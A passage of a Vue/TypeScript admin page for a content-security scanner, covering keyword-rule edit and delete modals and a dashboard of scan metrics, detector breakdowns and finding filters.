// ==========================================
// Modal State: Keyword Rule Details (View, Edit & Delete)
// ==========================================
const isKeywordDetailsLoading = ref(false);
const selectedKeywordRule = ref<KeywordRuleDetail | null>(null);
const editingKeywordRuleId = ref<number | null>(null);
const isSubmittingKeywordEdit = ref(false);
const isDeletingKeywordRule = ref(false);
const deletingKeywordRule = ref<{ id: number; keyword: string } | null>(null);

const keywordEditForm = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
}>({
  keyword: '',
  category: 'SPAM',
  severity: 'HIGH',
  match_type: 'WORD',
  is_enabled: true,
  description: ''
});

const originalKeywordRuleData = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
} | null>(null);

const keywordModalState = useAdminModalState<KeywordRuleDetail>({
  getItems: async (id) => {
    isKeywordDetailsLoading.value = true;
    try {
      const details = await contentSecurityService.getKeywordRuleDetails(String(id));
      return details;
    } catch (err: any) {
      const msg = extractErrorMessage(err, 'Failed to retrieve keyword rule details.');
      toastError(msg);
      return null;
    } finally {
      isKeywordDetailsLoading.value = false;
    }
  },
  onResolveError: (id) => {
    toastError(`Keyword Rule #${id} could not be resolved.`);
    keywordModalState.closeModal({ replace: true });
  }
});

watch(() => keywordModalState.activeEntity.value, (newEntity) => {
  if (newEntity) {
    selectedKeywordRule.value = newEntity;

    if (keywordModalState.isEdit.value) {
      if (!canEditKeywordRule.value) {
        toastError('You do not have permission to edit keyword rules.');
        keywordModalState.closeModal({ replace: true });
        return;
      }
      editingKeywordRuleId.value = newEntity.id;
      keywordEditForm.value = {
        keyword: newEntity.keyword || '',
        category: newEntity.category || 'SPAM',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'WORD',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalKeywordRuleData.value = {
        keyword: newEntity.keyword || '',
        category: newEntity.category || 'SPAM',
        severity: newEntity.severity || 'HIGH',
        match_type: newEntity.match_type || 'WORD',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }

    if (keywordModalState.isDelete.value) {
      if (!canDeleteKeywordRule.value) {
        toastError('You do not have permission to delete keyword rules.');
        keywordModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingKeywordRule.value) {
        deletingKeywordRule.value = {
          id: newEntity.id,
          keyword: newEntity.keyword || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => keywordModalState.isView.value, (isView) => {
  if (!isView && !keywordModalState.isEdit.value && !keywordModalState.isDelete.value) {
    selectedKeywordRule.value = null;
  }
}, { immediate: true });

watch(() => keywordModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingKeywordRuleId.value = null;
    originalKeywordRuleData.value = null;
  }
}, { immediate: true });

watch(() => keywordModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingKeywordRule.value = null;
  } else if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    keywordModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openKeywordViewModal = (id: number | string) => {
  if (!canViewKeywords.value) {
    toastError('You do not have permission to view keyword rules.');
    return;
  }
  keywordModalState.openView(id);
};

const closeKeywordViewModal = () => {
  keywordModalState.closeModal();
};

const openEditKeywordRuleModal = async (id: number | string) => {
  if (!canEditKeywordRule.value) {
    toastError('You do not have permission to edit keyword rules.');
    return;
  }
  await keywordModalState.openEdit(id);
};

const closeKeywordEditModal = async () => {
  await keywordModalState.closeModal();
};

const openDeleteKeywordRuleModal = async (rule: { id: number; keyword?: string }) => {
  if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    return;
  }
  deletingKeywordRule.value = {
    id: rule.id,
    keyword: rule.keyword || `Rule #${rule.id}`
  };
  await keywordModalState.openDelete(rule.id);
};

const closeKeywordDeleteModal = async () => {
  await keywordModalState.closeModal();
};

const executeDeleteKeywordRule = async () => {
  if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    return;
  }

  const targetId = deletingKeywordRule.value?.id || keywordModalState.activeId.value;
  if (!targetId) {
    toastError('Keyword rule identifier missing.');
    return;
  }

  if (isDeletingKeywordRule.value) return;

  isDeletingKeywordRule.value = true;
  try {
    await contentSecurityService.deleteKeywordRule(targetId);
    toastSuccess(`Keyword rule "${deletingKeywordRule.value?.keyword || `#${targetId}`}" deleted successfully.`);
    await closeKeywordDeleteModal();
    await fetchKeywordRules();

    if (keywordRulesData.value.length === 0 && keywordPage.value > 1) {
      keywordPage.value = Math.max(1, keywordPage.value - 1);
      await fetchKeywordRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete keyword rule.');
    toastError(msg);
  } finally {
    isDeletingKeywordRule.value = false;
  }
};

const submitUpdateKeywordRule = async () => {
  if (!canEditKeywordRule.value) {
    toastError('You do not have permission to edit keyword rules.');
    return;
  }

  if (!editingKeywordRuleId.value) {
    toastError('Keyword rule identifier missing.');
    return;
  }

  const trimmedKeyword = keywordEditForm.value.keyword.trim();
  if (!trimmedKeyword) {
    toastError('Keyword is required.');
    return;
  }

  const payload: UpdateKeywordRulePayload = {};
  const orig = originalKeywordRuleData.value;
  const current = keywordEditForm.value;

  if (orig) {
    if (trimmedKeyword !== orig.keyword.trim()) {
      payload.keyword = trimmedKeyword;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (current.match_type !== orig.match_type) {
      payload.match_type = current.match_type;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.keyword = trimmedKeyword;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.match_type = current.match_type;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeKeywordEditModal();
    return;
  }

  isSubmittingKeywordEdit.value = true;
  try {
    const updated = await contentSecurityService.updateKeywordRule(editingKeywordRuleId.value, payload);
    toastSuccess('Keyword rule updated successfully.');
    await closeKeywordEditModal();
    await fetchKeywordRules();

    if (selectedKeywordRule.value && String(selectedKeywordRule.value.id) === String(updated.id)) {
      selectedKeywordRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update keyword rule.');
    toastError(msg);
  } finally {
    isSubmittingKeywordEdit.value = false;
  }
};

const formatUserInfo = (userVal: any): string => {
  if (!userVal) return 'N/A';
  if (typeof userVal === 'string') return userVal;
  if (typeof userVal === 'number') return `User #${userVal}`;
  if (typeof userVal === 'object') {
    if (userVal.first_name || userVal.last_name) {
      return `${userVal.first_name || ''} ${userVal.last_name || ''}`.trim();
    }
    if (userVal.username) return userVal.username;
    if (userVal.email) return userVal.email;
    if (userVal.id) return `User #${userVal.id}`;
  }
  return 'N/A';
};

// ==========================================
// Modal State: Add / Edit Rule
// ==========================================
const isRuleModalOpen = ref(false);
const editingRule = ref<DetectionRule | null>(null);
const isSubmittingKeywordRule = ref(false);

const keywordCreateForm = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
}>({
  keyword: '',
  category: 'SPAM',
  severity: 'HIGH',
  match_type: 'WORD',
  is_enabled: true,
  description: ''
});

const ruleForm = ref({
  type: 'keyword' as DetectionRule['type'],
  pattern: '',
  category: 'General',
  severity: 'High' as SecuritySeverity,
  description: '',
  enabled: true
});

const openAddRuleModal = (type: DetectionRule['type']) => {
  editingRule.value = null;
  if (type === 'keyword') {
    if (!canAddKeywordRule.value) {
      toastError('You do not have permission to add keyword rules.');
      return;
    }
    keywordCreateForm.value = {
      keyword: '',
      category: 'SPAM',
      severity: 'HIGH',
      match_type: 'WORD',
      is_enabled: true,
      description: ''
    };
  }
  ruleForm.value = {
    type,
    pattern: '',
    category: type === 'keyword' ? 'Spam Blacklist' : type === 'domain' ? 'Malicious Domains' : type === 'html' ? 'Disallowed Tags' : type === 'attribute' ? 'Event Handlers' : 'Redirects',
    severity: 'High',
    description: '',
    enabled: true
  };
  isRuleModalOpen.value = true;
};

const openEditRuleModal = (rule: DetectionRule) => {
  editingRule.value = rule;
  ruleForm.value = {
    type: rule.type,
    pattern: rule.pattern,
    category: rule.category,
    severity: rule.severity,
    description: rule.description,
    enabled: rule.enabled
  };
  isRuleModalOpen.value = true;
};

const saveRule = async () => {
  // Handle Real Keyword Rule Creation via API
  if (ruleForm.value.type === 'keyword' && !editingRule.value) {
    if (!canAddKeywordRule.value) {
      toastError('You do not have permission to add keyword rules.');
      return;
    }

    const trimmedKeyword = keywordCreateForm.value.keyword.trim();
    if (!trimmedKeyword) {
      toastError('Keyword is required.');
      return;
    }

    try {
      isSubmittingKeywordRule.value = true;
      const payload: CreateKeywordRulePayload = {
        keyword: trimmedKeyword,
        category: keywordCreateForm.value.category,
        severity: keywordCreateForm.value.severity,
        match_type: keywordCreateForm.value.match_type,
        is_enabled: keywordCreateForm.value.is_enabled,
        ...(keywordCreateForm.value.description?.trim() 
          ? { description: keywordCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createKeywordRule(payload);
      toastSuccess('Keyword rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchKeywordRules();
    } catch (err: any) {
      toastError(err.message || 'Failed to create keyword rule.');
    } finally {
      isSubmittingKeywordRule.value = false;
    }
    return;
  }

  // Non-keyword or mock edit behavior
  if (!ruleForm.value.pattern.trim()) {
    toastError('Please enter a valid rule pattern.');
    return;
  }

  if (editingRule.value) {
    editingRule.value.pattern = ruleForm.value.pattern.trim();
    editingRule.value.category = ruleForm.value.category.trim();
    editingRule.value.severity = ruleForm.value.severity;
    editingRule.value.description = ruleForm.value.description.trim();
    editingRule.value.enabled = ruleForm.value.enabled;
    editingRule.value.updatedAt = new Date().toISOString().split('T')[0] || '2026-08-25';
    toastSuccess(`Rule ${editingRule.value.id} updated successfully.`);
  } else {
    const newId = `R-${ruleForm.value.type.substring(0, 2).toUpperCase()}-${Math.floor(10 + Math.random() * 90)}`;
    rules.value.unshift({
      id: newId,
      type: ruleForm.value.type,
      pattern: ruleForm.value.pattern.trim(),
      category: ruleForm.value.category.trim(),
      severity: ruleForm.value.severity,
      description: ruleForm.value.description.trim() || 'Custom administrator detection rule',
      enabled: ruleForm.value.enabled,
      matchCount: 0,
      updatedAt: new Date().toISOString().split('T')[0] || '2026-08-25'
    });
    toastSuccess(`New detection rule ${newId} created successfully.`);
  }

  isRuleModalOpen.value = false;
};

const toggleRuleStatus = (rule: DetectionRule) => {
  rule.enabled = !rule.enabled;
  if (rule.enabled) {
    toastSuccess(`Rule ${rule.id} has been enabled.`);
  } else {
    toastInfo(`Rule ${rule.id} has been disabled.`);
  }
};

const deleteRule = (rule: DetectionRule) => {
  rules.value = rules.value.filter(r => r.id !== rule.id);
  toastSuccess(`Rule ${rule.id} (${rule.pattern}) has been deleted.`);
};

// Filtered rules for current sub-tab
const filteredRules = computed(() => {
  const typeMap: Record<string, DetectionRule['type']> = {
    keywords: 'keyword',
    domains: 'domain',
    html: 'html',
    attributes: 'attribute',
    redirects: 'redirect'
  };
  const targetType = typeMap[rulesSubTab.value];
  return rules.value.filter(r => r.type === targetType);
});

// Table columns for Scan Results
const scanResultColumns: UiTableColumn<SecurityFinding>[] = [
  { key: 'status', label: 'Status', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'contentType', label: 'Type', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'contentName', label: 'Content Entity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 max-w-[280px]' },
  { key: 'field', label: 'Field', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'riskScore', label: 'Risk Score', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'findings', label: 'Detected Issue', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 max-w-[320px]' },
  { key: 'scannedAt', label: 'Scanned At', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right', width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

// Helper styles for badges
const getStatusBadge = (status: SecurityStatus) => {
  switch (status) {
    case 'Critical': return { variant: 'error' as const, label: 'Critical', icon: AlertOctagon };
    case 'High Risk': return { variant: 'error' as const, label: 'High Risk', icon: AlertTriangle };
    case 'Needs Review': return { variant: 'warning' as const, label: 'Needs Review', icon: Info };
    case 'Clean': return { variant: 'success' as const, label: 'Clean', icon: CheckCircle2 };
    case 'Resolved': return { variant: 'info' as const, label: 'Resolved', icon: Check };
    default: return { variant: 'secondary' as const, label: status, icon: Info };
  }
};

const getSeverityBadge = (severity: string) => {
  const val = severity?.toUpperCase();
  switch (val) {
    case 'CRITICAL': return 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30';
    case 'HIGH': return 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30';
    case 'MEDIUM': return 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30';
    case 'LOW': return 'bg-slate-500/10 text-slate-600 dark:text-slate-400 border-slate-500/30';
    case 'INFO': return 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30';
    default: return 'bg-slate-500/10 text-slate-600 border-slate-500/30';
  }
};
</script>

<template>
  <div class="space-y-6 animate-in fade-in duration-500 pb-12">
    <!-- Header Row -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-5">
      <div class="space-y-1">
        <div class="flex items-center gap-2">
          <div class="w-8 h-8 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center text-primary shadow-xs">
            <Shield class="w-4 h-4" />
          </div>
          <h1 class="text-2xl sm:text-3xl font-display font-extrabold tracking-tight text-foreground">
            Content Security
          </h1>
          <span class="ml-2 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider bg-primary/10 text-primary border border-primary/20">
            Active Guard
          </span>
        </div>
        <p class="text-xs sm:text-sm text-muted-foreground">
          Automated threat detection, payload inspection, and content integrity enforcement across products and categories.
        </p>
      </div>

      <!-- Header Actions -->
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-right hidden md:block">
          <p class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Last Scanned</p>
          <p class="text-xs font-semibold text-foreground flex items-center gap-1">
            <Clock class="w-3 h-3 text-muted-foreground" />
            {{ lastScanTimestamp }}
          </p>
        </div>

        <UiButton 
          @click="runFullScan" 
          :disabled="isScanning"
          class="h-10 px-5 gap-2 font-bold text-xs shadow-md shadow-primary/20 whitespace-nowrap"
        >
          <Play v-if="!isScanning" class="w-3.5 h-3.5 fill-current" />
          <RefreshCw v-else class="w-3.5 h-3.5 animate-spin" />
          <span>{{ isScanning ? 'Scanning Catalog...' : 'Run Scan' }}</span>
        </UiButton>
      </div>
    </div>

    <!-- Active Scan Banner (Shows when scan is running) -->
    <div 
      v-if="isScanning" 
      class="bg-card border border-primary/30 rounded-2xl p-4 sm:p-5 shadow-lg relative overflow-hidden animate-in fade-in duration-300"
    >
      <div class="absolute -right-12 -top-12 w-40 h-40 bg-primary/10 rounded-full blur-2xl"></div>
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-3 relative z-10">
        <div class="flex items-center gap-3">
          <div class="w-9 h-9 rounded-xl bg-primary text-primary-foreground flex items-center justify-center shrink-0 shadow-sm animate-pulse">
            <ShieldCheck class="w-5 h-5" />
          </div>
          <div>
            <h3 class="text-sm font-bold text-foreground">Executing Full Security Inspection</h3>
            <p class="text-xs text-muted-foreground font-mono">{{ scanStepText }}</p>
          </div>
        </div>
        <div class="text-right font-mono font-bold text-sm text-primary shrink-0">
          {{ scanProgress }}%
        </div>
      </div>
      <!-- Progress Bar -->
      <div class="w-full h-2 bg-muted rounded-full overflow-hidden relative z-10">
        <div 
          class="h-full bg-primary transition-all duration-500 rounded-full"
          :style="{ width: `${scanProgress}%` }"
        ></div>
      </div>
    </div>

    <!-- Primary Section Navigation Tabs -->
    <div class="flex items-center gap-2 border-b border-border">
      <button
        @click="mainTab = 'overview'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'overview'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <SlidersHorizontal class="w-4 h-4" />
        <span>Overview</span>
      </button>

      <button
        @click="mainTab = 'results'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'results'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <AlertTriangle class="w-4 h-4" />
        <span>Scan Results</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30 ml-1">
          {{ summaryMetrics.critical + summaryMetrics.high + summaryMetrics.needsReview }}
        </span>
      </button>

      <button
        @click="mainTab = 'rules'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'rules'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <Code2 class="w-4 h-4" />
        <span>Detection Rules</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-muted text-muted-foreground border border-border ml-1">
          {{ rules.length }}
        </span>
      </button>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 1: OVERVIEW TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'overview'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Summary Metrics Cards -->
      <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 sm:gap-4">
        <!-- Total Scanned -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-muted-foreground mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest">Total Scanned</span>
            <Layers class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-foreground">
              {{ summaryMetrics.total.toLocaleString() }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              4,120 Products, 186 Categories
            </p>
          </div>
        </div>

        <!-- Clean Rate -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-emerald-600 dark:text-emerald-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Clean</span>
            <CheckCircle2 class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-emerald-600 dark:text-emerald-400">
              {{ summaryMetrics.clean.toLocaleString() }}
            </p>
            <p class="text-[11px] text-emerald-600/90 dark:text-emerald-400/90 mt-1 font-semibold">
              {{ summaryMetrics.cleanPercent }}% Compliant
            </p>
          </div>
        </div>

        <!-- Needs Review -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-amber-600 dark:text-amber-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Needs Review</span>
            <Info class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-amber-600 dark:text-amber-400">
              {{ summaryMetrics.needsReview }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Pending manual inspection
            </p>
          </div>
        </div>

        <!-- High Risk -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-orange-600 dark:text-orange-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">High Risk</span>
            <AlertTriangle class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-orange-600 dark:text-orange-400">
              {{ summaryMetrics.high }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Dangerous links & attributes
            </p>
          </div>
        </div>

        <!-- Critical -->
        <div class="bg-card border border-rose-500/20 bg-rose-500/5 rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between col-span-2 sm:col-span-1">
          <div class="flex items-center justify-between text-rose-600 dark:text-rose-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-rose-600 dark:text-rose-400">Critical</span>
            <AlertOctagon class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-rose-600 dark:text-rose-400">
              {{ summaryMetrics.critical }}
            </p>
            <p class="text-[11px] text-rose-600/90 dark:text-rose-400/90 mt-1 font-semibold">
              Immediate action required
            </p>
          </div>
        </div>
      </div>

      <!-- Middle Grid: Detection Breakdown & Scanner Status -->
      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
        <!-- Detection Method Breakdown -->
        <div class="lg:col-span-4 bg-card border border-border rounded-2xl p-5 shadow-xs flex flex-col justify-between space-y-4">
          <div>
            <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
              <ShieldAlert class="w-4 h-4 text-primary" />
              Threats by Detector Type
            </h3>
            <p class="text-xs text-muted-foreground mt-0.5">Distribution of flagged payloads across rules</p>
          </div>

          <div class="space-y-3">
            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Blacklisted Domains</span>
                <span class="text-muted-foreground">3 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-rose-500 rounded-full" style="width: 40%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Dangerous HTML Tags (script/iframe)</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-orange-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Event Handlers & JS Attributes</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-amber-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Spam & Phishing Keywords</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-blue-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>
          </div>

          <div class="pt-3 border-t border-border flex items-center justify-between">
            <span class="text-xs text-muted-foreground font-medium">Active Rule Sets</span>
            <button 
              @click="mainTab = 'rules'" 
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              Configure Rules <ArrowRight class="w-3 h-3" />
            </button>
          </div>
        </div>

        <!-- Recent Findings Compact Section -->
        <div class="lg:col-span-8 bg-card border border-border rounded-2xl p-5 shadow-xs space-y-4">
          <div class="flex items-center justify-between">
            <div>
              <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
                <AlertTriangle class="w-4 h-4 text-amber-500" />
                Recent Flagged Findings
              </h3>
              <p class="text-xs text-muted-foreground mt-0.5">Latest high-priority security exceptions</p>
            </div>
            <button 
              @click="mainTab = 'results'"
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              View All ({{ filteredFindings.length }}) <ArrowRight class="w-3 h-3" />
            </button>
          </div>

          <!-- Compact List of Findings -->
          <div class="divide-y divide-border border border-border rounded-xl overflow-hidden">
            <div 
              v-for="item in recentFindings" 
              :key="item.id"
              @click="openFindingDetail(item)"
              class="p-3.5 hover:bg-muted/30 transition-colors flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer group"
            >
              <div class="flex items-start gap-3 min-w-0">
                <div 
                  :class="cn(
                    'w-8 h-8 rounded-lg flex items-center justify-center shrink-0 mt-0.5',
                    item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600' :
                    item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600' :
                    item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600' : 'bg-emerald-500/10 text-emerald-600'
                  )"
                >
                  <component :is="getStatusBadge(item.status).icon" class="w-4 h-4" />
                </div>
                <div class="min-w-0 space-y-0.5">
                  <div class="flex items-center gap-2 flex-wrap">
                    <span class="text-xs font-bold text-foreground group-hover:text-primary transition-colors truncate max-w-[280px] sm:max-w-[340px]">
                      {{ item.contentName }}
                    </span>
                    <span class="text-[10px] font-mono text-muted-foreground bg-muted px-1.5 py-0.5 rounded">
                      {{ item.field }}
                    </span>
                  </div>
                  <p class="text-xs text-muted-foreground line-clamp-1">
                    {{ item.description }}
                  </p>
                </div>
              </div>

              <div class="flex items-center justify-between sm:justify-end gap-3 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50">
                <div class="text-right">
                  <span 
                    :class="cn(
                      'px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                      item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/20' :
                      item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/20' :
                      item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/20' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/20'
                    )"
                  >
                    {{ item.status }}
                  </span>
                  <p class="text-[10px] text-muted-foreground mt-0.5">{{ item.scannedAt }}</p>
                </div>
                <button 
                  class="p-1.5 rounded-lg text-muted-foreground group-hover:text-primary hover:bg-muted transition-colors"
                  title="View finding details"
                >
                  <ChevronRight class="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 2: SCAN RESULTS TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'results'" class="space-y-4 animate-in fade-in duration-300">
      <!-- Search & Filters Toolbar -->
      <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
        <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
          <!-- Search Box -->
          <div class="relative flex-1">
            <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <input 
              v-model="searchQuery"
              type="text" 
              placeholder="Search content name, detected token, rule, or issue..." 
              class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            />
            <button 
              v-if="searchQuery" 
              @click="searchQuery = ''"
              class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              <X class="w-3.5 h-3.5" />
            </button>
          </div>

          <!-- Filter Dropdowns Row -->
          <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
            <!-- Content Type -->
            <select 
              v-model="filterContentType"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Content Types</option>
              <option value="Product">Products</option>
              <option value="Category">Categories</option>
            </select>

            <!-- Status Filter -->
            <select 
              v-model="filterStatus"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Statuses</option>
              <option value="Critical">Critical</option>
              <option value="High Risk">High Risk</option>
              <option value="Needs Review">Needs Review</option>
              <option value="Clean">Clean</option>
              <option value="Resolved">Resolved</option>
            </select>

            <!-- Severity Filter -->
            <select 
              v-model="filterSeverity"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Severities</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <!-- Detector Filter -->
            <select 
              v-model="filterDetector"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer hidden sm:block"
            >
              <option value="all">All Detectors</option>
              <option value="Keyword">Keyword</option>
              <option value="Domain">Domain</option>
              <option value="HTML">HTML</option>
              <option value="Attribute">Attribute</option>
              <option value="Redirect">Redirect</option>
              <option value="Hidden Content">Hidden Content</option>
              <option value="Obfuscation">Obfuscation</option>
            </select>

            <!-- Page Size Selector -->
